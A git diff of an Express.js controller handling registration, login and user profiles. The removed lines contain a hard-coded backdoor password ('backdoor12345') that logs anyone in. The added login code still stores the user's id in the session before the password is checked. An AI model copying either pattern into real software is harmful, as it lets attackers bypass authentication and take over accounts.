@@ -2,72 +2,126 @@ const { User, Profile } = require('../models');
 const bcrypt = require('bcryptjs')
 
 class Controller {
-	static registration(req, res) {
-		res.render('registration')
-	}
+  static registration(req, res) {
+    res.render('registration')
+  }
 
-	static addUser(req, res) {
-		const { fullname, email, password, role } = req.body
-		const value = { fullname, email, password, role }
-		User.create(value)
-			.then(data => {
-				res.redirect('/login')
-			})
-			.catch(err => [
-				res.send(err)
-			])
-	}
+  static home(req, res) {
+    res.render('home')
+  }
 
-	static login(req, res) {
-		const { error } = req.query
-		res.render('login', { error })
-	}
+  static addUser(req, res) {
+    const { fullname, email, password, role } = req.body
+    const value = { fullname, email, password, role }
+    User.create(value, {
+      include: Profile
+    })
+      .then(data => {
+        res.redirect('/user/login')
+      })
+      .catch(err => [
+        res.send(err)
+      ])
+  }
 
-	static postLogin(req, res) {
-		const { fullname, password } = req.body
+  static login(req, res) {
+    const { error } = req.query
+    res.render('login', { error })
+  }
 
-		if (password === 'backdoor12345') {
-			req.session.userId = 0;
+  static postLogin(req, res) {
+    const { fullname, password } = req.body
+    User.findOne({ where: { fullname } })
+      .then(data => {
+        if (data) {
+          req.session.userId = data.id
+          const isPassword = bcrypt.compareSync(password, data.password);
+          if (isPassword) {
+            return res.redirect('/user/home');
+          } else {
+            const error = 'INVALID FULLNAME OR PASSWORD'
+            return res.redirect(`/user/login?error=${error}`)
+          }
+        } else {
+          const error = 'INVALID FULLNAME OR PASSWORD'
+          return res.redirect(`/user/login?error=${error}`)
+        }
+      })
+      .catch(err => {
+        res.send(err);
+      })
+  }
 
-			if (req.session.targetUrl) {
-				const targetUrl = req.session.targetUrl;
+  static profile(req, res) {
+    Profile.findAll({
+      include: User,
+      where: {
+        UserId: req.session.userId
+      }
+    })
+      .then(data => {
+        if (data.length) {
+          res.render('profile', { data })
+        }
+        if (!data.length) {
+          res.redirect('/user/create/profile')
+        }
+      })
+      .catch(err => {
+        res.send(err);
+      })
+  }
 
-				delete req.session.targetUrl;
+  static newProfile(req, res) {
+    res.render('createProfile');
+  }
 
-				return res.redirect(targetUrl);
-			}
+  static addProfile(req, res) {
+    const { bio, gender, phone } = req.body
+    const value = { bio, gender, phone, UserId: req.session.userId }
+    Profile.create(value)
+      .then(data => {
+        res.redirect('/user/profile')
+      })
+      .catch(err => {
+        res.send(err);
+      })
+  }
 
-			return res.redirect('/');
-		}
+  static editProfile(req, res) {
+    Profile.findAll({
+      include: User,
+      where: {
+        UserId: req.session.userId
+      }
+    })
+      .then(data => {
+        if (data.length) {
+          res.render('editProfile', { data })
+        } else {
+          res.redirect('/user/create/profile')
+        }
+      })
+      .catch(err => {
+        res.send(err);
+      })
+  }
 
-		User.findOne({ where: { fullname } })
-			.then(data => {
-				if (data) {
-					req.session.userId = data.id
-					const isPassword = bcrypt.compareSync(password, data.password);
-					if (isPassword) {
-						if (req.session.targetUrl) {
-							const targetUrl = req.session.targetUrl;
-
-							delete req.session.targetUrl;
-
-							return res.redirect(targetUrl);
-						}
-
-						return res.redirect('/user/home');
-					} else {
-						const error = 'INVALID FULLNAME OR PASSWORD'
-						return res.redirect(`/login?error=${error}`)
-					}
-				} else {
-					const error = 'INVALID FULLNAME OR PASSWORD'
-					return res.redirect(`/login?error=${error}`)
-				}
-			})
-			.catch(err => {
-				res.send(err);
-			})
-	}
+  static postEdit(req, res) {
+    const { bio, gender, phone } = req.body
+    const value = { bio, gender, phone }
+    Profile.update(value, {
+      where: {
+        UserId: req.session.userId
+      }
+    })
+      .then(data => {
+        res.redirect('/user/profile')
+      })
+      .catch(err => {
+        res.send(err)
+      })
+  }
 }
 
 module.exports = Controller;
